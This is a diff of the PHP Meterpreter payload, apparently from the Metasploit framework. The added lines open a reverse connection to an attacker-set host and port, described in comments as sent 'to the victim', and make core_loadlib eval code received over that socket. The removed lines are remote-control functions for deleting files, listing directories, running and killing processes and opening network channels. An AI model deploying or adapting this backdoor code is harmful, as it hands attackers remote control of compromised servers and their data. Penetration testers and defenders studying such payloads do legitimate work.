@@ -1,14 +1,31 @@
-//<?php
-# The previous line lets us run as a standalone file or as eval'd code.  We use
-# a // for the comment instead of # so that the comment remover doesn't blow it
-# away.
+#<?php
 
+# global list of channels
+if (!isset($channels)) {
+    $channels = array();
+}
+
+# global resource map.  This is how we know whether to use socket or stream
+# functions on a channel.
+if (!isset($resource_type_map)) {
+    $resource_type_map = array();
+}
+
+# global list of resources we need to watch in the main select loop
+#if (!isset($readers)) {
+    $readers = array();
+#}
 
 function my_print($str) {
-    #error_log($str);
+    error_log($str);
     #print($str ."\n");
     #flush();
 }
+
+my_print("Evaling main meterpreter stage");
+
+# Be very careful not to put a # anywhere that isn't a comment (e.g. inside a
+# string) as the comment remover will completely break this payload
 
 function dump_array($arr, $name=null) {
     if (is_null($name)) {
@@ -278,403 +295,6 @@ function is_windows() {
 }
 
 
-##
-# STDAPI
-##
-
-# Wrap everything in checks for existence of the new functions in case we get
-# eval'd twice
-#my_print("Evaling stdapi");
-
-# Need to nail down what this should actually do.  In ruby, it doesn't expand
-# environment variables but in the windows meterpreter it does
-if (!function_exists('stdapi_fs_expand_path')) {
-function stdapi_fs_expand_path($req, &$pkt) {
-    my_print("doing expand_path");
-    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
-    return ERROR_FAILURE;
-}
-}
-
-# works
-if (!function_exists('stdapi_fs_chdir')) {
-function stdapi_fs_chdir($req, &$pkt) {
-    my_print("doing chdir");
-    $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
-    chdir($path_tlv['value']);
-    return ERROR_SUCCESS;
-}
-}
-
-# works
-if (!function_exists('stdapi_fs_delete')) {
-function stdapi_fs_delete($req, &$pkt) {
-    my_print("doing delete");
-    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_NAME);
-    $ret = unlink($path_tlv['value']);
-    return $ret ? ERROR_SUCCESS : ERROR_FAILURE;
-}
-}
-
-# works
-if (!function_exists('stdapi_fs_getwd')) {
-function stdapi_fs_getwd($req, &$pkt) {
-    my_print("doing pwd");
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_DIRECTORY_PATH, getcwd()));
-    return ERROR_SUCCESS;
-}
-}
-
-# works partially, need to get the path argument to mean the same thing as in
-# windows
-if (!function_exists('stdapi_fs_ls')) {
-function stdapi_fs_ls($req, &$pkt) {
-    my_print("doing ls");
-    $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
-    $path = $path_tlv['value'];
-    $dir_handle = @opendir($path);
-
-    if ($dir_handle) {
-        while ($file = readdir($dir_handle)) {
-            if ($file != "." && $file != "..") {
-                #my_print("Adding file $file");
-                packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_NAME, $file));
-                packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_PATH, $path . DIRECTORY_SEPARATOR . $file));
-                $st = stat($path . DIRECTORY_SEPARATOR . $file);
-                $st_buf = "";
-                $st_buf .= pack("V", $st['dev']);
-                $st_buf .= pack("v", $st['ino']);
-                $st_buf .= pack("v", $st['mode']);
-                $st_buf .= pack("v", $st['nlink']);
-                $st_buf .= pack("v", $st['uid']);
-                $st_buf .= pack("v", $st['gid']);
-                $st_buf .= pack("v", 0);
-                $st_buf .= pack("V", $st['rdev']);
-                $st_buf .= pack("V", $st['size']);
-                $st_buf .= pack("V", $st['atime']);
-                $st_buf .= pack("V", $st['mtime']);
-                $st_buf .= pack("V", $st['ctime']);
-                $st_buf .= pack("V", $st['blksize']);
-                $st_buf .= pack("V", $st['blocks']);
-                packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
-            }
-        }
-        closedir($dir_handle);
-        return ERROR_SUCCESS;
-    } else {
-        return ERROR_FAILURE;
-    }
-}
-}
-
-if (!function_exists('stdapi_fs_stat')) {
-function stdapi_fs_stat($req, &$pkt) {
-    my_print("doing stat");
-    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
-    $path = $path_tlv['value'];
-
-    $st = stat($path);
-    $st_buf = "";
-    $st_buf .= pack("V", $st['dev']);
-    $st_buf .= pack("v", $st['ino']);
-    $st_buf .= pack("v", $st['mode']);
-    $st_buf .= pack("v", $st['nlink']);
-    $st_buf .= pack("v", $st['uid']);
-    $st_buf .= pack("v", $st['gid']);
-    $st_buf .= pack("v", 0);
-    $st_buf .= pack("V", $st['rdev']);
-    $st_buf .= pack("V", $st['size']);
-    $st_buf .= pack("V", $st['atime']);
-    $st_buf .= pack("V", $st['mtime']);
-    $st_buf .= pack("V", $st['ctime']);
-    $st_buf .= pack("V", $st['blksize']);
-    $st_buf .= pack("V", $st['blocks']);
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
-}
-}
-
-# works
-if (!function_exists('stdapi_fs_delete_file')) {
-function stdapi_fs_delete_file($req, &$pkt) {
-    my_print("doing delete");
-    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
-    $path = $path_tlv['value'];
-
-    if ($path && is_file($path)) {
-        $worked = @unlink($path);
-        return ($worked ? ERROR_SUCCESS : ERROR_FAILURE);
-    } else {
-        return ERROR_FAILURE;
-    }
-}
-}
-
-# works
-if (!function_exists('stdapi_sys_config_getuid')) {
-function stdapi_sys_config_getuid($req, &$pkt) {
-    my_print("doing getuid");
-    if (is_callable('posix_getuid')) {
-        $uid = posix_getuid();
-        $pwinfo = posix_getpwuid($uid);
-        $user = $pwinfo['name'] . " ($uid)";
-    } else {
-        # The posix functions aren't available, this is probably windows.  Use
-        # the functions for getting user name and uid based on file ownership
-        # instead.
-        $user = get_current_user() . " (" . getmyuid() . ")";
-    }
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_USER_NAME, $user));
-    return ERROR_SUCCESS;
-}
-}
-
-# Unimplemented becuase it's unimplementable
-if (!function_exists('stdapi_sys_config_rev2self')) {
-function stdapi_sys_config_rev2self($req, &$pkt) {
-    my_print("doing rev2self");
-    return ERROR_FAILURE;
-}
-}
-
-# works
-if (!function_exists('stdapi_sys_config_sysinfo')) {
-function stdapi_sys_config_sysinfo($req, &$pkt) {
-    my_print("doing sysinfo");
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMPUTER_NAME, php_uname("n")));
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_OS_NAME, php_uname()));
-    return ERROR_SUCCESS;
-}
-}
-
-$processes = array();
-if (!function_exists('stdapi_sys_process_execute')) {
-function stdapi_sys_process_execute($req, &$pkt) {
-    my_print("doing execute");
-    $cmd_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_PATH);
-    $args_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_ARGUMENTS);
-    $flags_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_FLAGS);
-
-    $cmd = $cmd_tlv['value'];
-    $args = $args_tlv['value'];
-    $flags = $flags_tlv['value'];
-
-    # If there was no command specified, well, a user sending an empty command
-    # deserves failure.
-    my_print("Cmd: $cmd $args");
-    $real_cmd = $cmd ." ". $args;
-    if (0 > strlen($cmd)) {
-        return ERROR_FAILURE;
-    }
-    #my_print("Flags: $flags (" . ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) .")");
-    if ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) {
-        global $processes, $channels;
-        my_print("Channelized");
-        $handle = proc_open($real_cmd, array(array('pipe','r'), array('pipe','w'), array('pipe','w')), $pipes);
-        if ($handle === false) {
-            return ERROR_FAILURE;
-        }
-        $pipes['type'] = 'stream';
-        register_stream($pipes[0]);
-        register_stream($pipes[1]);
-        register_stream($pipes[2]);
-
-        $channels[] = $pipes;
-
-        # associate the process with this channel so we know when to close it.
-        $processes[count($channels) - 1] = $handle;
-
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, 0));
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_HANDLE, count($processes)-1));
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, count($channels)-1));
-    } else {
-        # Don't care about stdin/stdout, just run the command
-        my_cmd($real_cmd);
-    }
-
-    return ERROR_SUCCESS;
-}
-}
-
-# Works, but not very portable.  There doesn't appear to be a PHP way of
-# getting a list of processes, so we just shell out to ps/tasklist.exe.  I need
-# to decide what options to send to ps for portability and for information
-# usefulness.
-if (!function_exists('stdapi_sys_process_get_processes')) {
-function stdapi_sys_process_get_processes($req, &$pkt) {
-    my_print("doing get_processes");
-    $list = array();
-    if (is_windows()) {
-        # This command produces a line like:
-        #  "tasklist.exe","2264","Console","0","4,556 K","Running","EGYPT-B3E55BF3C\Administrator","0:00:00","OleMainThreadWndName"
-        $output = my_cmd("tasklist /v /fo csv /nh");
-        $lines = explode("\n", trim($output));
-        foreach ($lines as $line) {
-            $line = trim($line);
-            #
-            # Ghetto CSV parsing
-            #
-            $pieces = preg_split('/","/', $line);
-            # Strip off the initial quote on the first and last elements
-            $pieces[0] = substr($pieces[0], 1, strlen($pieces[0]));
-            $cnt = count($pieces) - 1;
-            $pieces[$cnt] = substr($pieces[$cnt], 1, strlen($pieces[$cnt]));
-
-            $proc_info = array($pieces[1], $pieces[6], $pieces[0]);
-            array_push($list, $proc_info);
-        }
-    } else {
-        # This command produces a line like:
-        #    1553 root     /sbin/getty -8 38400 tty1
-        $output = my_cmd("ps a -w -o pid,user,cmd --no-header 2>/dev/null");
-        $lines = explode("\n", trim($output));
-        foreach ($lines as $line) {
-            array_push($list, preg_split("/\s+/", trim($line)));
-        }
-    }
-    foreach ($list as $proc) {
-        $grp = "";
-        $grp .= tlv_pack(create_tlv(TLV_TYPE_PID, $proc[0]));
-        $grp .= tlv_pack(create_tlv(TLV_TYPE_USER_NAME, $proc[1]));
-        $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_NAME, $proc[2]));
-        # Strip the pid and the user name off the front; the rest will be the
-        # full command line
-        array_shift($proc);
-        array_shift($proc);
-        $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_PATH, join($proc, " ")));
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_GROUP, $grp));
-    }
-    return ERROR_SUCCESS;
-}
-}
-
-# works
-if (!function_exists('stdapi_sys_process_getpid')) {
-function stdapi_sys_process_getpid($req, &$pkt) {
-    my_print("doing getpid");
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, getmypid()));
-    return ERROR_SUCCESS;
-}
-}
-
-if (!function_exists('stdapi_sys_process_kill')) {
-function stdapi_sys_process_kill($req, &$pkt) {
-    # The existence of posix_kill is unlikely (it's a php compile-time option
-    # that isn't enabled by default, but better to try it and avoid shelling
-    # out when unnecessary.
-    my_print("doing kill");
-    $pid_tlv = packet_get_tlv($req, TLV_TYPE_PID);
-    $pid = $pid_tlv['value'];
-    if (is_callable('posix_kill')) {
-        $ret = posix_kill($pid, 9);
-        $ret = $ret ? ERROR_SUCCESS : posix_get_last_error();
-        if ($ret != ERROR_SUCCESS) {
-            my_print(posix_strerror($ret));
-        }
-    } else {
-        $ret = ERROR_FAILURE;
-        if (is_windows()) {
-            my_cmd("taskkill /f /pid $pid");
-            # Don't know how to check for success yet, so just assume it worked
-            $ret = ERROR_SUCCESS;
-        } else {
-            if ("foo" == my_cmd("kill -9 $pid && echo foo")) {
-                $ret = ERROR_SUCCESS;
-            }
-        }
-    }
-    return $ret;
-}
-}
-
-if (!function_exists('stdapi_net_socket_tcp_shutdown')) {
-function stdapi_net_socket_tcp_shutdown($req, &$pkt) {
-    global $channels;
-    $cid_tlv = packet_get_tlv(TLV_TYPE_CHANNEL_ID, $req);
-    $c = get_channel_by_id($cid_tlv['value']);
-
-    if ($c && $c['type'] == 'socket') {
-        @socket_shutdown($c[0], $how);
-        $ret = ERROR_SUCCESS;
-    } else {
-        $ret = ERROR_FAILURE;
-    }
-    return $ret;
-}
-}
-# END STDAPI
-
-
-
-
-
-##
-# Channel Helper Functions
-##
-
-# global list of channels
-$channels = array();
-
-function channel_create_stdapi_fs_file($req, &$pkt) {
-    global $channels;
-    $fpath_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
-    $mode_tlv = packet_get_tlv($req, TLV_TYPE_FILE_MODE);
-    #my_print("Opening path {$fpath_tlv['value']} with mode {$mode_tlv['value']}");
-    if (!$mode_tlv) {
-        $mode_tlv = array('value' => 'rb');
-    }
-    $fd = @fopen($fpath_tlv['value'], $mode_tlv['value']);
-
-    if (is_resource($fd)) {
-        register_stream($fd);
-        array_push($channels, array(0 => $fd, 1 => $fd, 'type' => 'stream'));
-        $id = count($channels) - 1;
-        my_print("Created new file channel $fd, with id $id");
-        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
-        return ERROR_SUCCESS;
-    } else {
-        my_print("Failed to open");
-    }
-    return ERROR_FAILURE;
-}
-
-
-function channel_create_stdapi_net_tcp_client($req, &$pkt) {
-    global $channels, $readers;
-    $peer_host_tlv = packet_get_tlv($req, TLV_TYPE_PEER_HOST);
-    $peer_port_tlv = packet_get_tlv($req, TLV_TYPE_PEER_PORT);
-    $local_host_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_HOST);
-    $local_port_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_PORT);
-    $retries_tlv = packet_get_tlv($req, TLV_TYPE_CONNECT_RETRIES);
-
-    if (is_callable('socket_create')) {
-        $sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-        $res = socket_connect($sock, $peer_host_tlv['value'], $peer_port_tlv['value']);
-        if (!$res) {
-            return ERROR_FAILURE;
-        }
-        register_socket($sock);
-    } else {
-        $sock = fsockopen($peer_host_tlv['value'], $peer_port_tlv['value']);
-        if (!$sock) {
-            return ERROR_FAILURE;
-        }
-        register_stream($sock);
-    }
-
-    #
-    # If we got here, the connection worked, respond with the new channel ID
-    #
-
-    array_push($channels, array(0 => $sock, 1 => $sock, 'type' => get_rtype($sock)));
-    $id = count($channels) - 1;
-    my_print("Created new channel $sock, with id $id");
-    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
-    array_push($readers, $sock);
-    return ERROR_SUCCESS;
-}
-
-
-
 
 
 
@@ -827,16 +447,18 @@ function core_channel_interact($req, &$pkt) {
     return $ret;
 }
 
-# Libraries are sent as a zlib-compressed blob.  Unfortunately, zlib support is
-# not default in non-Windows versions of PHP or anything before 4.3.0 so we
-# need some way to indicate to the client that we can't handle compressed
-# blobs.  Until then, don't actually implement loadlib yet.  Maybe someday
-# we'll have ext_server_stdapi.php or whatever.  For now just return success.
+# zlib support is not compiled in by default, so this makes sure the library
+# isn't compressed before eval'ing it
+# TODO: check for zlib support and decompress if possible
 function core_loadlib($req, &$pkt) {
     my_print("doing core_loadlib (no-op)");
     $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
-    
-    return ERROR_SUCCESS;
+	if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) {
+		return ERROR_FAILURE;
+	} else {
+		eval($data_tlv['value']);
+		return ERROR_SUCCESS;
+	}
 }
 
 
@@ -1027,30 +649,11 @@ function packet_get_tlv($pkt, $type) {
 }
 
 
+##
+# Functions for genericizing the stream/socket conundrum
+##
 
 
-function add_reader($resource) {
-    global $readers;
-    my_print("-- Adding {$resource} to readers");
-    if (is_resource($resource) && !in_array($resource, $readers)) {
-        array_push($readers, $resource);
-    }
-}
-
-function remove_reader($resource) {
-    global $readers;
-    if (in_array($resource, $readers)) {
-        my_print("-- Removing $resource from readers");
-        foreach ($readers as $key => $r) {
-            if ($r == $resource) {
-                unset($readers[$key]);
-                break;
-            }
-        }
-    }
-}
-
-$resource_type_map = array();
 function register_socket($sock) {
     global $resource_type_map;
     my_print("Registering socket $sock");
@@ -1190,6 +793,24 @@ function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
     return $count;
 }
 
+function add_reader($resource) {
+    global $readers;
+    if (is_resource($resource) && !in_array($resource, $readers)) {
+        $readers[] = $resource;
+    }
+}
+
+function remove_reader($resource) {
+    global $readers;
+    my_print("Readers $readers");
+    if (in_array($resource, $readers)) {
+        foreach ($readers as $key => $r) {
+            if ($r == $resource) {
+                unset($readers[$key]);
+            }
+        }
+    }
+}
 
 
 ##
@@ -1207,49 +828,45 @@ error_reporting(0);
 # Has no effect in safe mode, but try anyway
 @set_time_limit(0);
 
-# The payload handler overwrites this with the correct LPORT before sending
-# it to the victim.
-$port = 4444;
 
-$listen = false;
-if ($listen) {
-    # Assume that the socket functions are available since there really isn't
-    # any other way to create a server socket.  XXX Investigate using COM
-    # objects to accomplish this in Windows since socket_* are unavailable by
-    # default.
-
-    my_print("Listening on $port");
-
-
-    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-    # don't care if this fails
-    @socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
-    $ret = socket_bind($sock, 0, $port);
-    $ret = socket_listen($sock, 5);
-    $msgsock = socket_accept($sock);
-    socket_close($sock);
-
-    my_print("Got a socket connection $msgsock");
-} else {
-    my_print("Connecting to $port");
-
+# If we don't have a socket we're standalone, setup the connection here.
+# Otherwise, this is a staged payload, don't bother connecting
+if (!isset($msgsock)) {
     # The payload handler overwrites this with the correct LHOST before sending
     # it to the victim.
     $ipaddr = '127.0.0.1';
-    if (is_callable('socket_create')) {
-        $msgsock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-        $res = socket_connect($msgsock,$ipaddr,$port);
-        if (!$res) { die(); }
-        register_socket($msgsock);
-    } else {
+    $port = 4444;
+    if (FALSE !== strpos($ipaddr,":")) {
+        # ipv6 requires brackets around the address
+        $ipaddr = "[".$ipaddr."]";
+    }
+    if (is_callable('stream_socket_client')) {
+        $msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");
+        if (!$msgsock) { die(); }
+        $msgsock_type = 'stream';
+    } elseif (is_callable('fsockopen')) {
         $msgsock = fsockopen($ipaddr,$port);
         if (!$msgsock) { die(); }
-        register_stream($msgsock);
+        $msgsock_type = 'stream';
+    } elseif (is_callable('socket_create')) {
+        $msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        $res = socket_connect($msgsock, $ipaddr, $port);
+        if (!$res) { die(); }
+        $msgsock_type = 'socket';
+    } else {
+        die();
     }
 }
 
+switch ($msgsock_type) {
+case 'socket': register_socket($msgsock); break;
+case 'stream':
+    # fall through
+default: 
+    register_stream($msgsock); break;
+}
 
-$readers = array($msgsock);
+add_reader($msgsock);
 
 #
 # Main dispatch loop
